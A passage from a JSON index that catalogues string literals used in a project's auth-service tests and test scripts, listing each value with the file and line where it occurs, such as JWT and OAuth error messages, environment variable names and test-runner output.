      "locations": [
        "auth_service/tests/integration/test_auth_oauth_errors.py:249"
      ]
    },
    "Invalid auth provider:": {
      "value": "Invalid auth provider:",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/utils/assertion_helpers.py:106"
      ]
    },
    "Invalid authorization code": {
      "value": "Invalid authorization code",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_auth_oauth_errors.py:171"
      ]
    },
    "Invalid base64 encoding in JWT part:": {
      "value": "Invalid base64 encoding in JWT part:",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/utils/test_helpers.py:227"
      ]
    },
    "Invalid base64url encoding in JWT part": {
      "value": "Invalid base64url encoding in JWT part",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/utils/assertion_helpers.py:48"
      ]
    },
    "Invalid characters in state:": {
      "value": "Invalid characters in state:",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/unit/test_oauth_state_security.py:54"
      ]
    },
    "Invalid characters test - Service ID: '": {
      "value": "Invalid characters test - Service ID: '",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_service_id_configuration_failures.py:184"
      ]
    },
    "Invalid config response:": {
      "value": "Invalid config response:",
      "category": "test_literals",
      "locations": [
        "scripts/test_websocket_dev_mode.py:102"
      ]
    },
    "Invalid credentials": {
      "value": "Invalid credentials",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_security.py:479",
        "auth_service/tests/test_security.py:505",
        "auth_service/tests/test_security.py:646",
        "auth_service/tests/utils/test_client.py:263"
      ]
    },
    "Invalid email format:": {
      "value": "Invalid email format:",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/utils/assertion_helpers.py:24"
      ]
    },
    "Invalid health response:": {
      "value": "Invalid health response:",
      "category": "test_literals",
      "locations": [
        "scripts/test_websocket_dev_mode.py:132"
      ]
    },
    "Invalid input detected": {
      "value": "Invalid input detected",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_security.py:129"
      ]
    },
    "Invalid or malformed parameters": {
      "value": "Invalid or malformed parameters",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_auth_oauth_errors.py:397"
      ]
    },
    "Invalid permission format:": {
      "value": "Invalid permission format:",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/utils/assertion_helpers.py:217"
      ]
    },
    "Invalid rate limit remaining:": {
      "value": "Invalid rate limit remaining:",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/utils/assertion_helpers.py:244"
      ]
    },
    "Invalid service ID": {
      "value": "Invalid service ID",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_security.py:212"
      ]
    },
    "Invalid state should fail validation": {
      "value": "Invalid state should fail validation",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/unit/test_oauth_state_security.py:83"
      ]
    },
    "Invalid timeout '": {
      "value": "Invalid timeout '",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_staging_shutdown_timeouts.py:370",
        "auth_service/tests/test_critical_staging_shutdown_timeouts.py:374"
      ]
    },
    "Invalid token": {
      "value": "Invalid token",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:1044",
        "auth_service/tests/test_security.py:182",
        "auth_service/tests/test_security.py:620",
        "auth_service/tests/utils/test_client.py:306"
      ]
    },
    "Invalid token format": {
      "value": "Invalid token format",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_security.py:612"
      ]
    },
    "Invalid username pattern 'user_pr-4' found in staging URL": {
      "value": "Invalid username pattern 'user_pr-4' found in staging URL",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_staging_database_credentials.py:72"
      ]
    },
    "Is Cloud SQL:": {
      "value": "Is Cloud SQL:",
      "category": "test_literals",
      "locations": [
        "scripts/test_database_url_builder_comprehensive.py:41",
        "scripts/test_database_url_builder_comprehensive.py:97",
        "scripts/test_staging_migrations.py:190"
      ]
    },
    "Isolation and multi-tenancy tests": {
      "value": "Isolation and multi-tenancy tests",
      "category": "test_literals",
      "locations": [
        "scripts/unified_test_config.py:107"
      ]
    },
    "It is STRONGLY recommended to:": {
      "value": "It is STRONGLY recommended to:",
      "category": "test_literals",
      "locations": [
        "scripts/auto_fix_test_violations.py:951"
      ]
    },
    "Iteration": {
      "value": "Iteration",
      "category": "test_literals",
      "locations": [
        "scripts/automated_test_fix_loop.py:104",
        "scripts/batch_fix_and_test.py:64"
      ]
    },
    "Iterations with all tests passing:": {
      "value": "Iterations with all tests passing:",
      "category": "test_literals",
      "locations": [
        "scripts/iterative_test_fix_loop.py:165"
      ]
    },
    "Iterations with failures:": {
      "value": "Iterations with failures:",
      "category": "test_literals",
      "locations": [
        "scripts/iterative_test_fix_loop.py:166"
      ]
    },
    "Iterations:": {
      "value": "Iterations:",
      "category": "test_literals",
      "locations": [
        "scripts/automated_test_fix_loop.py:133"
      ]
    },
    "Iterative test-fix loop script that runs tests and fixes failures in a loop.": {
      "value": "Iterative test-fix loop script that runs tests and fixes failures in a loop.",
      "category": "test_literals",
      "locations": [
        "scripts/iterative_test_fix_loop.py:2"
      ]
    },
    "JSON report saved to": {
      "value": "JSON report saved to",
      "category": "test_literals",
      "locations": [
        "scripts/analyze_test_overlap.py:503"
      ]
    },
    "JWT": {
      "value": "JWT",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_auth_token_security.py:211",
        "auth_service/tests/unified/test_jwt_validation.py:86",
        "auth_service/tests/unit/test_oauth_jwt_security_validator.py:80",
        "auth_service/tests/unit/test_oauth_jwt_security_validator.py:89",
        "auth_service/tests/unit/test_oauth_jwt_security_validator.py:100",
        "auth_service/tests/unit/test_oauth_jwt_security_validator.py:134",
        "auth_service/tests/unit/test_oauth_jwt_security_validator.py:143",
        "auth_service/tests/unit/test_oauth_jwt_security_validator.py:152",
        "auth_service/tests/unit/test_oauth_jwt_security_validator.py:172",
        "auth_service/tests/unit/test_oauth_jwt_security_validator.py:188"
      ]
    },
    "JWT Secret:": {
      "value": "JWT Secret:",
      "category": "test_literals",
      "locations": [
        "scripts/test_config_loading.py:95"
      ]
    },
    "JWT Secret: MISSING": {
      "value": "JWT Secret: MISSING",
      "category": "test_literals",
      "locations": [
        "scripts/test_staging_config.py:130"
      ]
    },
    "JWT Secret: OK - Configured (from": {
      "value": "JWT Secret: OK - Configured (from",
      "category": "test_literals",
      "locations": [
        "scripts/test_staging_config.py:128"
      ]
    },
    "JWT Validation Tests - Auth Service Security Testing\n\nBusiness Value: Authentication security for cross-service communication\nTests JWT signature validation, claims requirements, and token revocation\n\nCRITICAL: Uses real JWT libraries (PyJWT) with proper security testing\nMaximum 300 lines enforced - focused on core JWT validation only": {
      "value": "JWT Validation Tests - Auth Service Security Testing\n\nBusiness Value: Authentication security for cross-service communication\nTests JWT signature validation, claims requirements, and token revocation\n\nCRITICAL: Uses real JWT libraries (PyJWT) with proper security testing\nMaximum 300 lines enforced - focused on core JWT validation only",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/unified/test_jwt_validation.py:1"
      ]
    },
    "JWT handling imports failed:": {
      "value": "JWT handling imports failed:",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_auth_service_integration_reliability.py:108"
      ]
    },
    "JWT parsing error": {
      "value": "JWT parsing error",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/unit/test_oauth_jwt_security_validator.py:201"
      ]
    },
    "JWT secret not configured": {
      "value": "JWT secret not configured",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/unit/test_oauth_jwt_security_validator.py:62"
      ]
    },
    "JWT secret not configured for development environment": {
      "value": "JWT secret not configured for development environment",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/unit/test_oauth_jwt_security_validator.py:65"
      ]
    },
    "JWT security validation error": {
      "value": "JWT security validation error",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/unit/test_oauth_jwt_security_validator.py:208"
      ]
    },
    "JWT_ALGORITHM": {
      "value": "JWT_ALGORITHM",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/config/test_env.py:23",
        "auth_service/tests/config/test_settings.py:177"
      ]
    },
    "JWT_SECRET": {
      "value": "JWT_SECRET",
      "category": "test_literals",
      "locations": [
        "auth_service/debug_db_test.py:11",
        "auth_service/tests/config/test_env.py:22",
        "auth_service/tests/config/test_settings.py:176",
        "auth_service/tests/conftest.py:29",
        "auth_service/tests/test_five_whys_reproduction.py:326",
        "auth_service/tests/test_five_whys_reproduction.py:351",
        "auth_service/tests/test_setup.py:17",
        "auth_service/tests/test_setup.py:18"
      ]
    },
    "JWT_SECRET_KEY": {
      "value": "JWT_SECRET_KEY",
      "category": "test_literals",
      "locations": [
        "auth_service/test_actual_staging_credentials.py:43",
        "auth_service/test_url_construction.py:44",
        "auth_service/tests/test_auth_token_generation.py:38",
        "auth_service/tests/test_auth_token_validation.py:38",
        "auth_service/tests/test_auth_token_validation.py:157",
        "auth_service/tests/test_auth_token_validation.py:181",
        "auth_service/tests/test_auth_token_validation.py:258",
        "auth_service/tests/test_critical_oauth_environment_failures.py:46",
        "auth_service/tests/test_critical_oauth_environment_failures.py:92",
        "auth_service/tests/test_critical_oauth_environment_failures.py:132"
      ]
    },
    "JWT_SECRET_KEY must be at least 32 characters in production": {
      "value": "JWT_SECRET_KEY must be at least 32 characters in production",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/unit/test_oauth_jwt_security_validator.py:46"
      ]
    },
    "Jane Doe": {
      "value": "Jane Doe",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_auth_oauth_google.py:264"
      ]
    },
    "Job failed": {
      "value": "Job failed",
      "category": "test_literals",
      "locations": [
        "scripts/test_workflows_with_act.py:170"
      ]
    },
    "John Doe": {
      "value": "John Doe",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_auth_oauth_google.py:249"
      ]
    },
    "KEY": {
      "value": "KEY",
      "category": "test_literals",
      "locations": [
        "scripts/test_config_loading.py:49",
        "scripts/test_oauth_local.py:77"
      ]
    },
    "KEY FINDING:": {
      "value": "KEY FINDING:",
      "category": "test_literals",
      "locations": [
        "auth_service/test_actual_staging_credentials.py:173"
      ]
    },
    "K_REVISION": {
      "value": "K_REVISION",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_service_id_configuration_failures.py:257",
        "auth_service/tests/test_critical_staging_shutdown_timeouts.py:97",
        "scripts/test_config_loading.py:34",
        "scripts/test_environment_detection.py:18"
      ]
    },
    "K_SERVICE": {
      "value": "K_SERVICE",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_service_id_configuration_failures.py:132",
        "auth_service/tests/test_critical_service_id_configuration_failures.py:256",
        "auth_service/tests/test_critical_staging_issues.py:124",
        "auth_service/tests/test_critical_staging_issues.py:172",
        "auth_service/tests/test_critical_staging_shutdown_timeouts.py:50",
        "auth_service/tests/test_critical_staging_shutdown_timeouts.py:96",
        "auth_service/tests/test_critical_staging_shutdown_timeouts.py:270",
        "auth_service/tests/test_postgres_compliance.py:202",
        "scripts/test_config_loading.py:34",
        "scripts/test_environment_detection.py:17"
      ]
    },
    "K_SERVICE=netra-backend:": {
      "value": "K_SERVICE=netra-backend:",
      "category": "test_literals",
      "locations": [
        "scripts/test_environment_detection.py:51"
      ]
    },
    "K_SERVICE=netra-prod-backend:": {
      "value": "K_SERVICE=netra-prod-backend:",
      "category": "test_literals",
      "locations": [
        "scripts/test_environment_detection.py:58"
      ]
    },
    "K_SERVICE=netra-staging-backend:": {
      "value": "K_SERVICE=netra-staging-backend:",
      "category": "test_literals",
      "locations": [
        "scripts/test_environment_detection.py:44"
      ]
    },
    "Key findings: Your AI workloads show 30% optimization potential.\n        Main bottlenecks: Memory allocation and network I/O.\n        Quick wins: Enable caching, batch requests, optimize prompts.\n        Estimated savings: $2,400/month with recommended changes.": {
      "value": "Key findings: Your AI workloads show 30% optimization potential.\n        Main bottlenecks: Memory allocation and network I/O.\n        Quick wins: Enable caching, batch requests, optimize prompts.\n        Estimated savings: $2,400/month with recommended changes.",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/services/realistic_test_data/llm_response_generator.py:203"
      ]
    },
    "Key principles:": {
      "value": "Key principles:",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/test_limits_examples.py:264"
      ]
    },
    "Key should exist after setting": {
      "value": "Key should exist after setting",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_redis_connection_failover.py:69"
      ]
    },
    "Kill these processes? (y/n):": {
      "value": "Kill these processes? (y/n):",
      "category": "test_literals",
      "locations": [
        "scripts/cleanup_test_processes.py:111"
      ]
    },
    "Killed": {
      "value": "Killed",
      "category": "test_literals",
      "locations": [
        "scripts/cleanup_test_processes.py:126"
      ]
    },
    "Killed PID": {
      "value": "Killed PID",
      "category": "test_literals",
      "locations": [
        "scripts/cleanup_test_processes.py:121"
      ]
    },
    "Killing processes...": {
      "value": "Killing processes...",
      "category": "test_literals",
      "locations": [
        "scripts/cleanup_test_processes.py:116"
      ]
    },
    "L1": {
      "value": "L1",
      "category": "test_literals",
      "locations": [
        "scripts/analyze_test_mocks.py:22",
        "scripts/analyze_test_mocks.py:23",
        "scripts/analyze_test_mocks.py:24"
      ]
    },
    "L2": {
      "value": "L2",
      "category": "test_literals",
      "locations": [
        "scripts/analyze_test_mocks.py:21"
      ]
    },
    "L3": {
      "value": "L3",
      "category": "test_literals",
      "locations": [
        "scripts/analyze_test_mocks.py:16",
        "scripts/analyze_test_mocks.py:17",
        "scripts/analyze_test_mocks.py:18",
        "scripts/analyze_test_mocks.py:19",
        "scripts/analyze_test_mocks.py:20"
      ]
    },
    "L3 pattern": {
      "value": "L3 pattern",
      "category": "test_literals",
      "locations": [
        "scripts/generate_test_audit.py:99",
        "scripts/generate_test_audit.py:220",
        "scripts/generate_test_audit.py:221"
      ]
    },
    "L3 test files": {
      "value": "L3 test files",
      "category": "test_literals",
      "locations": [
        "scripts/standardize_l3_test_names.py:230"
      ]
    },
    "LARGEST FILES:": {
      "value": "LARGEST FILES:",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/test_size_validator.py:427"
      ]
    },
    "LARGEST FUNCTIONS:": {
      "value": "LARGEST FUNCTIONS:",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/test_size_validator.py:431"
      ]
    },
    "LIKELY CAUSE OF AUTH FAILURES:": {
      "value": "LIKELY CAUSE OF AUTH FAILURES:",
      "category": "test_literals",
      "locations": [
        "auth_service/test_actual_staging_credentials.py:107"
      ]
    },
    "LLM Configurations:": {
      "value": "LLM Configurations:",
      "category": "test_literals",
      "locations": [
        "scripts/test_config_loading.py:78",
        "scripts/test_staging_config.py:103"
      ]
    },
    "LLM Response Generator\n\nThis module generates realistic LLM responses with production-like characteristics.": {
      "value": "LLM Response Generator\n\nThis module generates realistic LLM responses with production-like characteristics.",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/services/realistic_test_data/llm_response_generator.py:1"
      ]
    },
    "LLM initialization failed": {
      "value": "LLM initialization failed",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/agents/test_agent_initialization.py:62"
      ]
    },
    "LLMManager()": {
      "value": "LLMManager()",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/test_fixer.py:320"
      ]
    },
    "LLMResponseGenerator": {
      "value": "LLMResponseGenerator",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/services/realistic_test_data/__init__.py:82"
      ]
    },
    "LOAD_SECRETS": {
      "value": "LOAD_SECRETS",
      "category": "test_literals",
      "locations": [
        "scripts/test_config_loading.py:34",
        "scripts/test_staging_config.py:41",
        "scripts/test_staging_config.py:63"
      ]
    },
    "LOGIN_FAILED": {
      "value": "LOGIN_FAILED",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/factories/audit_factory.py:20",
        "auth_service/tests/factories/audit_factory.py:89"
      ]
    },
    "LOGIN_SUCCESS": {
      "value": "LOGIN_SUCCESS",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/factories/audit_factory.py:19",
        "auth_service/tests/factories/audit_factory.py:70"
      ]
    },
    "LOGOUT": {
      "value": "LOGOUT",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/factories/audit_factory.py:21",
        "auth_service/tests/factories/audit_factory.py:104"
      ]
    },
    "LOG_ASYNC_CHECKOUT": {
      "value": "LOG_ASYNC_CHECKOUT",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_postgres_compliance.py:127"
      ]
    },
    "LOG_LEVEL": {
      "value": "LOG_LEVEL",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/config/test_env.py:51",
        "auth_service/tests/config/test_env.py:165",
        "auth_service/tests/config/test_env.py:174",
        "auth_service/tests/config/test_env.py:184",
        "auth_service/tests/config/test_env.py:195",
        "auth_service/tests/config/test_settings.py:198",
        "scripts/test_backend.py:92",
        "scripts/test_config_loading.py:142",
        "scripts/test_staging_config.py:45"
      ]
    },
    "LONG_VALUE": {
      "value": "LONG_VALUE",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_service_id_configuration_failures.py:336"
      ]
    },
    "Large file (": {
      "value": "Large file (",
      "category": "test_literals",
      "locations": [
        "scripts/fix_all_test_issues.py:261"
      ]
    },
    "Lib": {
      "value": "Lib",
      "category": "test_literals",
      "locations": [
        "scripts/business_value_test_index.py:134",
        "scripts/generate_test_audit.py:27",
        "scripts/test_exclusion_check.py:22"
      ]
    },
    "Line": {
      "value": "Line",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/real_test_requirements_enforcer.py:366",
        "scripts/fix_e2e_test_imports.py:152",
        "scripts/fix_e2e_test_imports.py:160",
        "scripts/fix_e2e_test_imports.py:169",
        "scripts/standardize_l3_test_names.py:86",
        "scripts/test_workflows_with_act.py:238"
      ]
    },
    "Line:": {
      "value": "Line:",
      "category": "test_literals",
      "locations": [
        "scripts/remove_test_stubs.py:329"
      ]
    },
    "Lint test files for real test requirements compliance": {
      "value": "Lint test files for real test requirements compliance",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/real_test_linter.py:254"
      ]
    },
    "List available categories and their configuration": {
      "value": "List available categories and their configuration",
      "category": "test_literals",
      "locations": [
        "scripts/unified_test_runner.py:850"
      ]
    },
    "List processes only, don't kill": {
      "value": "List processes only, don't kill",
      "category": "test_literals",
      "locations": [
        "scripts/cleanup_test_processes.py:156"
      ]
    },
    "List[": {
      "value": "List[",
      "category": "test_literals",
      "locations": [
        "scripts/fix_test_import_errors.py:228"
      ]
    },
    "Load test reports from test_reports/.": {
      "value": "Load test reports from test_reports/.",
      "category": "test_literals",
      "locations": [
        "scripts/team_updates_test_analyzer.py:34"
      ]
    },
    "Loaded test environment from": {
      "value": "Loaded test environment from",
      "category": "test_literals",
      "locations": [
        "scripts/test_backend.py:71"
      ]
    },
    "Loading configuration...": {
      "value": "Loading configuration...",
      "category": "test_literals",
      "locations": [
        "scripts/test_config_loading.py:56",
        "scripts/test_staging_config.py:70"
      ]
    },
    "Loading coverage data...": {
      "value": "Loading coverage data...",
      "category": "test_literals",
      "locations": [
        "scripts/business_value_test_index.py:790"
      ]
    },
    "Loading test results...": {
      "value": "Loading test results...",
      "category": "test_literals",
      "locations": [
        "scripts/business_value_test_index.py:793"
      ]
    },
    "Local Development": {
      "value": "Local Development",
      "category": "test_literals",
      "locations": [
        "scripts/unified_test_config.py:126"
      ]
    },
    "Local OAuth Testing Script with Enhanced Debugging\nTests the complete OAuth flow locally with detailed logging\n\nThis script:\n1. Tests OAuth configuration\n2. Simulates OAuth login flow\n3. Validates token generation\n4. Checks auth service communication": {
      "value": "Local OAuth Testing Script with Enhanced Debugging\nTests the complete OAuth flow locally with detailed logging\n\nThis script:\n1. Tests OAuth configuration\n2. Simulates OAuth login flow\n3. Validates token generation\n4. Checks auth service communication",
      "category": "test_literals",
      "locations": [
        "scripts/test_oauth_local.py:2"
      ]
    },
    "Local services started successfully": {
      "value": "Local services started successfully",
      "category": "test_literals",
      "locations": [
        "scripts/start_test_services.py:129"
      ]
    },
    "Localhost in staging (should fail)": {
      "value": "Localhost in staging (should fail)",
      "category": "test_literals",
      "locations": [
        "scripts/test_database_url_builder_comprehensive.py:211"
      ]
    },
    "Localhost:3000 should be allowed in development": {
      "value": "Localhost:3000 should be allowed in development",
      "category": "test_literals",
      "locations": [
        "scripts/test_websocket_dev_mode.py:152"
      ]
    },
    "Location": {
      "value": "Location",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_auth_oauth_errors.py:141",
        "auth_service/tests/integration/test_auth_oauth_google.py:99",
        "auth_service/tests/integration/test_auth_oauth_google.py:102",
        "auth_service/tests/integration/test_auth_oauth_google.py:322"
      ]
    },
    "Log Data Generator\n\nThis module generates realistic log data with specific patterns and behaviors.": {
      "value": "Log Data Generator\n\nThis module generates realistic log data with specific patterns and behaviors.",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/services/realistic_test_data/log_generator.py:1"
      ]
    },
    "LogGenerator": {
      "value": "LogGenerator",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/services/realistic_test_data/__init__.py:83"
      ]
    },
    "Logged out": {
      "value": "Logged out",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/utils/test_client.py:85"
      ]
    },
    "Login failed with status": {
      "value": "Login failed with status",
      "category": "test_literals",
      "locations": [
        "scripts/test_cold_start_e2e.py:254"
      ]
    },
    "Long Service ID test result:": {
      "value": "Long Service ID test result:",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_service_id_configuration_failures.py:354"
      ]
    },
    "Long timeout": {
      "value": "Long timeout",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_graceful_shutdown_failures.py:374"
      ]
    },
    "Long-duration soak testing": {
      "value": "Long-duration soak testing",
      "category": "test_literals",
      "locations": [
        "scripts/unified_test_config.py:101"
      ]
    },
    "Low - Utilities": {
      "value": "Low - Utilities",
      "category": "test_literals",
      "locations": [
        "scripts/test_failure_scanner.py:47"
      ]
    },
    "MAJOR (should fix)": {
      "value": "MAJOR (should fix)",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/real_test_linter.py:121"
      ]
    },
    "MALFORMED.TOKEN.HERE": {
      "value": "MALFORMED.TOKEN.HERE",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:429"
      ]
    },
    "MANUAL ACTION REQUIRED -": {
      "value": "MANUAL ACTION REQUIRED -",
      "category": "test_literals",
      "locations": [
        "scripts/auto_fix_test_violations.py:845"
      ]
    },
    "MAX_LOGIN_ATTEMPTS": {
      "value": "MAX_LOGIN_ATTEMPTS",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/config/test_env.py:59"
      ]
    },
    "MAX_SESSIONS_PER_USER": {
      "value": "MAX_SESSIONS_PER_USER",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/config/test_settings.py:181"
      ]
    },
    "MB": {
      "value": "MB",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/services/realistic_test_data/log_generator.py:117"
      ]
    },
    "MD5": {
      "value": "MD5",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/unit/test_oauth_jwt_security_validator.py:97"
      ]
    },
    "MEDIUM": {
      "value": "MEDIUM",
      "category": "test_literals",
      "locations": [
        "scripts/ci/check_test_stubs.py:66",
        "scripts/remove_test_stubs.py:175",
        "scripts/remove_test_stubs.py:231"
      ]
    },
    "MIGRATION TEST SUMMARY": {
      "value": "MIGRATION TEST SUMMARY",
      "category": "test_literals",
      "locations": [
        "scripts/test_staging_migrations.py:307"
      ]
    },
    "MINOR (nice to fix)": {
      "value": "MINOR (nice to fix)",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/real_test_linter.py:123"
      ]
    },
    "MISSING": {
      "value": "MISSING",
      "category": "test_literals",
      "locations": [
        "scripts/test_config_loading.py:86",
        "scripts/test_config_loading.py:95",
        "scripts/test_config_loading.py:96",
        "scripts/test_config_loading.py:105",
        "scripts/test_config_loading.py:106"
      ]
    },
    "MagicMock()": {
      "value": "MagicMock()",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/real_test_requirements_enforcer.py:356"
      ]
    },
    "MagicMock, MagicMock": {
      "value": "MagicMock, MagicMock",
      "category": "test_literals",
      "locations": [
        "scripts/simple_test_fix_loop.py:45"
      ]
    },
    "MagicMock\\(": {
      "value": "MagicMock\\(",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/project_test_validator.py:273"
      ]
    },
    "MagicMock\\(\\)": {
      "value": "MagicMock\\(\\)",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/real_test_validator.py:235"
      ]
    },
    "Main": {
      "value": "Main",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/test_fixer.py:163"
      ]
    },
    "Main entry point for optimized test execution": {
      "value": "Main entry point for optimized test execution",
      "category": "test_literals",
      "locations": [
        "scripts/test_backend_optimized.py:360"
      ]
    },
    "Main entry point.": {
      "value": "Main entry point.",
      "category": "test_literals",
      "locations": [
        "scripts/test_cold_start_e2e.py:501",
        "scripts/test_coordination_fixes.py:404"
      ]
    },
    "Main test function.": {
      "value": "Main test function.",
      "category": "test_literals",
      "locations": [
        "auth_service/test_staging_db_connection.py:277",
        "scripts/test_websocket_dev_mode.py:332",
        "scripts/test_websocket_simple.py:51"
      ]
    },
    "Main test runner": {
      "value": "Main test runner",
      "category": "test_literals",
      "locations": [
        "scripts/test_auth_integration.py:164"
      ]
    },
    "MainTestSettings": {
      "value": "MainTestSettings",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/config/__init__.py:9"
      ]
    },
    "Malformed Service ID '": {
      "value": "Malformed Service ID '",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_service_id_configuration_failures.py:323"
      ]
    },
    "Malformed token should be invalid:": {
      "value": "Malformed token should be invalid:",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_auth_token_validation.py:128"
      ]
    },
    "Malformed token should be rejected:": {
      "value": "Malformed token should be rejected:",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_oauth_id_token_validation.py:131"
      ]
    },
    "Malicious sites should be blocked": {
      "value": "Malicious sites should be blocked",
      "category": "test_literals",
      "locations": [
        "scripts/test_websocket_dev_mode.py:158"
      ]
    },
    "Many test failures are due to:": {
      "value": "Many test failures are due to:",
      "category": "test_literals",
      "locations": [
        "scripts/fix_common_test_issues.py:75"
      ]
    },
    "Markdown report saved to": {
      "value": "Markdown report saved to",
      "category": "test_literals",
      "locations": [
        "scripts/analyze_test_overlap.py:508"
      ]
    },
    "Markers added:": {
      "value": "Markers added:",
      "category": "test_literals",
      "locations": [
        "scripts/add_test_markers.py:227"
      ]
    },
    "Maximum number of files to analyze": {
      "value": "Maximum number of files to analyze",
      "category": "test_literals",
      "locations": [
        "scripts/auto_fix_test_violations.py:926"
      ]
    },
    "Maximum number of files to process": {
      "value": "Maximum number of files to process",
      "category": "test_literals",
      "locations": [
        "scripts/auto_fix_test_sizes.py:721"
      ]
    },
    "Maximum number of worker processes for Jest (frontend tests)": {
      "value": "Maximum number of worker processes for Jest (frontend tests)",
      "category": "test_literals",
      "locations": [
        "scripts/unified_test_runner.py:763"
      ]
    },
    "Maximum token limit exceeded": {
      "value": "Maximum token limit exceeded",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/services/realistic_test_data/models.py:119"
      ]
    },
    "Medium - Integration": {
      "value": "Medium - Integration",
      "category": "test_literals",
      "locations": [
        "scripts/test_failure_scanner.py:45"
      ]
    },
    "Medium - Models": {
      "value": "Medium - Models",
      "category": "test_literals",
      "locations": [
        "scripts/test_failure_scanner.py:46"
      ]
    },
    "Memory Intensive:": {
      "value": "Memory Intensive:",
      "category": "test_literals",
      "locations": [
        "scripts/unified_test_runner.py:903"
      ]
    },
    "Memory allocation failed, retrying": {
      "value": "Memory allocation failed, retrying",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/services/realistic_test_data/log_generator.py:120"
      ]
    },
    "Message flow test PASSED": {
      "value": "Message flow test PASSED",
      "category": "test_literals",
      "locations": [
        "scripts/test_websocket_dev_mode.py:206"
      ]
    },
    "Message validation failed:": {
      "value": "Message validation failed:",
      "category": "test_literals",
      "locations": [
        "scripts/test_example_message_flow.py:304"
      ]
    },
    "Method '": {
      "value": "Method '",
      "category": "test_literals",
      "locations": [
        "scripts/auto_fix_test_violations.py:249"
      ]
    },
    "Method not found error:": {
      "value": "Method not found error:",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_staging_issues.py:94"
      ]
    },
    "Methods should behave consistently across concurrent calls": {
      "value": "Methods should behave consistently across concurrent calls",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_auth_database_manager_missing_method.py:440"
      ]
    },
    "Metrics exported": {
      "value": "Metrics exported",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/services/realistic_test_data/log_generator.py:131"
      ]
    },
    "Migration Safety Checks": {
      "value": "Migration Safety Checks",
      "category": "test_literals",
      "locations": [
        "scripts/test_staging_migrations.py:282"
      ]
    },
    "Migration URL Generation": {
      "value": "Migration URL Generation",
      "category": "test_literals",
      "locations": [
        "scripts/test_staging_migrations.py:280"
      ]
    },
    "Migration URL valid:": {
      "value": "Migration URL valid:",
      "category": "test_literals",
      "locations": [
        "scripts/test_staging_migrations.py:207"
      ]
    },
    "Migration URL:": {
      "value": "Migration URL:",
      "category": "test_literals",
      "locations": [
        "scripts/test_staging_migrations.py:62",
        "scripts/test_staging_migrations.py:239"
      ]
    },
    "Minimal output": {
      "value": "Minimal output",
      "category": "test_literals",
      "locations": [
        "scripts/test_backend.py:502",
        "scripts/test_backend_optimized.py:391"
      ]
    },
    "Minimal output for CI logs": {
      "value": "Minimal output for CI logs",
